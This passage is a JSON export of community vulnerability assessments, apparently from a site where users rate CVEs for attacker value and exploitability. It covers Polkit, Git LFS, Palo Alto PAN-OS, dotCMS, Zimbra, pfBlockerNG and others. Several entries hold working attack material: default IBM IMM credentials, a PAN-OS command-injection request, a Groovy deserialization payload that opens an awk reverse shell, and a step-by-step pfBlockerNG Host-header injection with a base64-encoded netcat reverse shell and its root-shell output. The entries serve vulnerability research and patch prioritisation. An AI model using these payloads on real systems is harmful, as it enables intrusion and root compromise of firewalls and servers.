          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "75831cf7-5ca1-4196-b274-534d6aeff327",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "f4545332-6166-4686-8a4d-b3f302fa8a44",
      "created": "2022-10-05T09:20:56.573737Z",
      "revisionDate": "2022-10-05T09:34:45.168933Z",
      "document": "IBM Integrated Management Module (IMM) have some default admin credentials (`USERID` / `PASSW0RD`). The default credentials are working on the WebUI as well as on telnet and SSH that are accessible by default. The vulnerability allows to inject system commands. However the **big tradeoff** is that the exploit is not public.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "21e3de1c-a9d3-4b8c-b79d-f3972b7bcf65",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "10791c9d-4c05-4c36-8f8d-baa2ee6dc9b7",
      "created": "2022-10-05T19:28:59.332594Z",
      "revisionDate": "2022-10-06T17:23:32.833237Z",
      "document": "Polkit is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged ones. D-Bus is a message-oriented middleware mechanism that allows communication between multiple processes running concurrently on the same machine. \r\n\r\nA vulnerbility was found in Polkit that allows a local unprivileged attacker to obtain execution as the root user. The attacker needs to invoke method over D-bus and then kill the client process. Not always, but sometimes this will cause the operation to complete without requiring authenetication. \r\n\r\nThis allows a local unprivilged attacker to attempt to create a new user with sudo access and a known password. When successful, the attacker can then execute a payload with root privileges. \r\n\r\nThis is bad. Polkit is installed by default across many linux distributions making this a fantastic attack vector. Very important to patch!",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "69a47021-9d61-4a7e-b398-f5aee4b73273",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "9d83751a-bd35-4385-afbf-669af96e4d67",
      "created": "2022-10-06T18:03:14.140801Z",
      "revisionDate": "2022-10-06T18:03:14.136584Z",
      "document": "Git Large File Storage or Git LFS is an open source extention used to store large files outside of the git repository. Git LFS stores the large file on a remote server while storing a pointer to the file in the repo. \r\n\r\nGit LFS (git-lfs) versions <= 2.12 has a vulnerability that allows remote attackers to execute arbitrary code on the victim's Windows system if the victim clones the attacker's repository which makes use of git-lfs. \r\n\r\nGit LFS does not specify the full path to the git binary when spawning a new git process as via the following ExecCommand() function:\r\n\r\n`subprocess/subprocess_windows.go`:\r\n```\r\n    func ExecCommand(name string, arg ...string) *Cmd {\r\n        cmd := exec.Command(name, arg...)\r\n        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n        cmd.Env = fetchEnvironment()\r\n        return newCmd(cmd)\r\n    }\r\n```\r\n\r\n\r\n If the attacker places a malicious executable file in the repository (which must be named either, git.bat, git.exe or git.cmd) when the repository gets cloned the malicous file gets executed instead of the original git binary located in a trusted path.\r\n\r\nThis can lead to priviliged access and take over of the windows host that gets tricked into cloning the malicious repo. Definitely worth patching although due to the level of user interaction required (they have to preform the clone) I would say the exploitability rating is quite low dispite having a CVSS score of 9.8",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "605862e0-ea0d-485f-b7ce-9a1ab7475f46",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "2e72d5aa-2dca-4b08-bd6a-1d96b2001082",
      "created": "2022-10-06T18:13:48.672985Z",
      "revisionDate": "2022-10-07T02:59:23.415977Z",
      "document": "The only downside of this vulnerability is that you don't get command execution as root, you get execution in the context of the user running WSO2. Other than that, this is an attackers delight. It is is extremely trivial to exploit. Unpatched WSO2 API Managers should not be internet facing. There is a metasploit module as well as PoC details available. For more information see the Rapid7 Analysis. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4404eb52-e94b-4e96-bcac-566a9b5d3cf6",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "ae095fa4-d1b3-455a-a4a4-75e3b7a277f8",
      "created": "2022-10-06T19:40:07.538816Z",
      "revisionDate": "2022-10-07T07:17:23.065365Z",
      "document": "A textbook command injection vulnerability. \r\n\r\nAn authenticated user is able to send whats referred to as op ([operational mode command](https://docs.paloaltonetworks.com/pan-os/9-0/pan-os-panorama-api/pan-os-xml-api-request-types/run-operational-mode-commands-api)) requests to the API.  One of the operational mode commands supported is a ping request that gets run as root by the server. Intended to allow users to send a host address to the server and for the server to then ping that host to see if it responds to ICMP requests. However, as you may have guessed, the request to the API doesn't get sanitized well enough and you can inject/ append OS commands to the end of the ping request which then get executed as root.\r\n\r\nOnce authenticated, you can use the following GET request to run the `id` command: \r\n```\r\nGET /api/?cmd=%3ccms-ping%3e%3chost%3e151.7.17.75%3c/host%3e%3ccount%3e22%3c/count%3e%3cpattern%3e111%3c%21%5bCDATA%5b%7c%7cid%7c%7c%5d%5d%3e%3c/pattern%3e%3c/cms-ping%3e&type=op&key=LUFRPT04bEFiL1gzV1VNS3JHTkZ5dStqaURmS2ZoWXM9R24zVDdib0NMdjZIWDVqTGJqUXVhN3VPWVFSWW8yY0dsZUVKUTRsS004UEhMVHhOSVRES3BEcDR0TUJCZUg0aQ%3d%3d HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\r\nCookie: PHPSESSID=ff726cde08ee6755f82453a00685a2c1\r\n```\r\n\r\nDespite needing authentication, this is pretty bad. An attacker getting root access to your firewall will be enough to ruin your day. Palo Alto Network firewalls are popular and widely deployed, patch if you haven't already!",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "06881616-ada5-45b9-823e-0fb468796d8a",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "31f21a40-c8af-4842-ae53-6ed0d6b11e1a",
      "created": "2022-10-06T20:05:22.665849Z",
      "revisionDate": "2022-10-07T07:17:21.998488Z",
      "document": "CVE-2020-26352 is an unauthenticated directory traversal vulnerability in dotCMS which allows for arbitrary file upload and effectively RCE. \r\n\r\nWhen files are uploaded to DotCMS via the file upload API, before the file becomes content, dotCMS writes the file down in a temporary directory.  The vulnerability lies in the fact that DotCMS does not sanitize the filename passed in via the multipart request header and thus does not sanitize the temporary file's name. This allows an attacker to craft a request to POST files to dotCMS via the ContentResource API that gets written outside of the dotCMS temporary directory. An attacker can upload a specially crafted .jsp file to the webapp/ROOT directory of dotCMS which can allow for remote code execution.\r\n\r\nA [metasploit module](https://github.com/rapid7/metasploit-framework/pull/16611) is available and easy to use. If you have an internet facing dotCMS instance running, make sure it's patched!",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "da0eabab-f27f-4c0f-b047-d7b848561917",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "82991046-210f-4c54-a578-8e09bd9f6d88",
      "created": "2022-10-06T21:31:37.193818Z",
      "revisionDate": "2022-10-07T07:17:03.336399Z",
      "document": "This is I think the 6th major issue with Zimbra this year. It's not really their fault, they use Amavis which uses `cpio` which is vulnerable to CVE-2015-1197, but the attack surface for incoming emails is HUGE.\r\n\r\nNot to mention, this is one of several vulnerabilities this year that was being exploited in the wild before being discovered, which means Zimbra is an active target for the Bad Guys.\r\n\r\nIf you're still using Zimbra, you might want to seriously reconsider. I betcha there are others, and they're probably being exploited.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6c604151-a860-42b4-a478-0d364c52566c",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "8aa21692-1900-4944-98ab-bec257302198",
      "created": "2022-10-07T08:52:28.600467Z",
      "revisionDate": "2022-10-07T08:52:28.597922Z",
      "document": "The only file you can rely on for detection is `/WEB-INF/web.xml`, but to read something else you'll have to know the directory structure which is unlikely when you audit a client infrastructure. To achieve RCE you'll be required to get file upload which is also less likely. In many cases in real life it may end not useful outside proving the vulnerability exists.\r\nThere are still some chances you can read `/RELEASE-NOTES.txt`if you don't have another mean to know the version used.\r\n\r\nIf the application is deployed under an unguessable path it's likely you won't be able to go further but if you can reach to the app and browse it'll may be able to understand paths and try to read the source code of the application.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "dc7fafd5-d4ae-420f-bb31-f09b04cf067a",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "7909a9d8-cce7-4e15-a7eb-285c7ed9a8ed",
      "created": "2022-10-09T15:29:34.123152Z",
      "revisionDate": "2022-10-09T15:29:34.12262Z",
      "document": "It's easy to get RCE with a Groovy payload. Your code will be executed even if you receive an HTTP 500 error.\r\n\r\nExample of request / payload:\r\n\r\n```xml\r\nPOST /createItem?name=example HTTP/1.1\r\nHost: example.org\r\nContent-Length: 689\r\nContent-Type: application/xml;\r\nAccept: text/javascript, text/html, application/xml, text/xml, */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n<map>\r\n  <entry>\r\n    <groovy.util.Expando>\r\n      <expandoProperties>\r\n        <entry>\r\n          <string>hashCode</string>\r\n          <org.codehaus.groovy.runtime.MethodClosure>\r\n            <delegate class=\"groovy.util.Expando\"/>\r\n            <owner class=\"java.lang.ProcessBuilder\">\r\n              <command>\r\n                <string>awk</string>\r\n                <string>'BEGIN {s = \"/inet/tcp/0/192.168.1.14/9999\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'</string>\r\n                <string>/dev/null</string>\r\n              </command>\r\n            </owner>\r\n            <method>start</method>\r\n          </org.codehaus.groovy.runtime.MethodClosure>\r\n        </entry>\r\n      </expandoProperties>\r\n    </groovy.util.Expando>\r\n    <int>1</int>\r\n  </entry>\r\n</map>\r\n```",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9089c8ba-bee5-4751-8668-57477455301e",
      "editorId": "92cc908f-ddd9-49f9-9241-99865614d1dd",
      "topicId": "288e3ca7-1388-488a-81d9-e93edffaa221",
      "created": "2022-10-10T17:26:05.247322Z",
      "revisionDate": "2022-10-11T04:55:16.852576Z",
      "document": "really easy to exploit and weaponize!",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "334cf789-8c84-473c-93b2-6a0957ce6775",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "def91ce8-e74e-49b0-8c97-d4a6e31f0184",
      "created": "2022-10-10T21:59:42.958101Z",
      "revisionDate": "2022-10-10T21:59:42.957636Z",
      "document": "This vulnerability is old now and targets old version of Rails. But if you face such an app it's really easy to get RCE using an existing PoC. However, editing the YAML manually can be difficult because it's very space sensitive.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b92682a8-86ef-427c-94ec-60b31158f4e4",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "288e3ca7-1388-488a-81d9-e93edffaa221",
      "created": "2022-10-14T21:39:41.367982Z",
      "revisionDate": "2022-10-17T20:31:16.364945Z",
      "document": "A vulnerability lets you send requests to the backend API service that appear to be coming from a trusted frontend application. As a result, you can call any REST API without authentication, which is pretty bad considering this is a security appliance.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d19857f7-18fc-44fd-9035-ac9f96a3f79c",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "a025b969-bb70-4702-96c5-51891785cbf6",
      "created": "2022-10-16T08:09:38.082473Z",
      "revisionDate": "2022-10-25T16:54:18.579243Z",
      "document": "pfSense\u2019s pfBlockerNG plugin version 2.1.4_26  and versions below has remote command execution vulnerability that can be exploited without any authentication and will provide root access.\r\nCredits go the IHTeam who discovered this vulnerability in September 2022. CVE-2022-31814 carries a CVSS score of 9.8 and this vulnerability is likely to be exploited in the wild.\r\n\r\n**pfBlockerNG** (https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html) is a pfSense plugin that is NOT installed by default and it\u2019s generally used to block inbound connections from whole countries or IP ranges.\r\nThe vulnerability was identified in the file `/usr/local/www/pfblockerng/www/index.php` which is used to record and query DNSBL data. Specifically to query, the code uses PHP function exec(), passing untrusted data into the command line code below:\r\n\r\n```\r\n// Query DNSBL Alias for Domain List.\r\n$query = str_replace('.', '\\.', htmlspecialchars($_SERVER['HTTP_HOST']));\r\n\r\nexec(\"/usr/bin/grep -l ' \\\"{$query} 60 IN A' /var/db/pfblockerng/dnsblalias/*\", $match);\r\n```\r\nThe `$_SERVER[\u2018HTTP_HOST\u2019]` element passed in the above code, is a user-controllable input. An attacker can tamper with the `HTTP_HOST` parameter via the `\"Host:\" header` of the request.\r\n\r\nThere are a few restrictions in place that you need to bypass to make this work:\r\n- htmlspecialchars() PHP function was preventing the use of shell redirections (> and <), double quotes (\u201c), and ampersand (&)\r\n- nginx web server won\u2019t accept the forward slash (/) in the Host header, returning a 400 \u2013 Bad Request\r\n\r\nTherefore, the only available characters to build a working payload were:\r\n - pipe (|)\r\n - semicolon (;)\r\n - single quote (\u2018)\r\n - spaces ( )\r\n\r\nOther limitations are:\r\n- Python is installed on pfSense , but it does not have the symbolic links (python3,  python), so you need to specifically mention the version a.k.a. `python3.8`\r\n- `base64` is not installed, so for base64 decoding we will use the `python3.8 -m base64 -d` option\r\n\r\nSo let's play around what we can do here...\r\nTo easily identify a valid payload, we can copy the original command in the exec() function and try to tamper with it directly in a shell:\r\n\r\n/usr/bin/grep -l ' \"`INJECTION` 60 IN A' /var/db/pfblockerng/dnsblalias/*\r\n\r\nIn order to obtain a working PoC, we need:\r\n\r\n- Close the single quote\r\n- Specify a directory to search on\r\n- Break the command with a semicolon\r\n- Comment or add an additional single quote\r\n\r\nA simple example is the sleep command below.\r\n```\r\n' *; sleep 5; '\r\n```\r\nThis can be used as a simple test to see if your remote command execution works.\r\n\r\nFor more complex payloads that requires the restricted characters like forward slashes (/), double quotes (\"\") and ampersand (&), we should encode our payload with `base64` and decode using `python3.8` for execution.\r\n\r\nA simple netcat scenario is `nc 192.168.201.8 4444 -e /bin/sh` and encode it with base64, however the `-e` option is controlled by an ip_sec_policy on the pfSense firewall which restricts the usage of the `-e` option.\r\nIt is a still a firewall, right ;-)\r\n\r\nSo another alternative is to use the reverse netcat option generated with `msfvenom` that does not use the `-e` option.\r\n```\r\n# msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.100.7 LPORT=4444 -f raw\r\n[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload\r\n[-] No arch selected, selecting arch: cmd from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 95 bytes\r\nmkfifo /tmp/klmql; nc 192.168.100.7 4444 0</tmp/klmql | /bin/sh >/tmp/klmql 2>&1; rm /tmp/klmql\r\n# echo 'mkfifo /tmp/klmql; nc 192.168.100.7 4444 0</tmp/klmql | /bin/sh >/tmp/klmql 2>&1; rm /tmp/klmql' | base64\r\nbWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK\r\n```\r\nLet's take this encoded payload (please check for any restricted characters) and use  python to decode payload for execution -> `python3.8 -m base64 -d`\r\n\r\nHence, the final payload to obtain a reverse netcat shell in pfSense would be as follows:\r\n\r\n/usr/bin/grep -l ' \"`' * ; echo bWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK | python3.8 -m base64 -d | sh ; '` 60 IN A' /var/db/pfblockerng/dnsblalias/*\r\n\r\nLet's now use burpsuite to send our payload to the vulnerable `pfblockerng` plugin by manipulating the `\"Host:\" header ` parameter to launch a netcat shell\r\n```\r\nGET /pfblockerng/www/index.php HTTP/1.1\r\nHost: ' * ; echo bWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK | python3.8 -m base64 -d | sh ; '\r\n```\r\nClick send and voila, we have established a netcat session on the attacker machine with root privileges.\r\n```\r\n# nc -lnvp 4444\r\nlistening on [any] 4444 ...\r\nconnect to [192.168.100.7] from (UNKNOWN) [192.168.100.47] 45051\r\npwd\r\n/usr/local/www/pfblockerng/www\r\nwhoami\r\nroot\r\n```\r\n\r\nAs stated in the beginning of this analysis, pfSense default installation does not have the `pfblockerng` plugin installed by default, but unfortunately it is a popular plugin that is used on many installations of pfSense. It therefore makes it a very attractive target for malicious actors to explore.\r\n\r\nThere is already a Metasploit module available that exploits this vulnerability using php to launch a webshell and it has the options to spawn reverse shells.\r\n\r\n## Mitigation\r\nPlease update your `pfBlockerNG` plugin to the latest version.\r\n\r\n## References\r\n[IHTeam advisory] (https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/)\r\n[Packetstorm] (https://packetstormsecurity.com/files/168484/pfBlockerNG-2.1.4_26-Shell-Upload.html)\r\n[Metasploit Mainstream] (https://www.rapid7.com/blog/post/2022/10/14/metasploit-wrap-up-155/)\r\n",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "20f166a8-1160-4e84-af87-b074f3a729b2",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "d89b0899-566e-45e9-b853-6845e492a9c2",
      "created": "2022-10-20T19:41:40.652702Z",
      "revisionDate": "2022-12-11T23:03:59.524432Z",
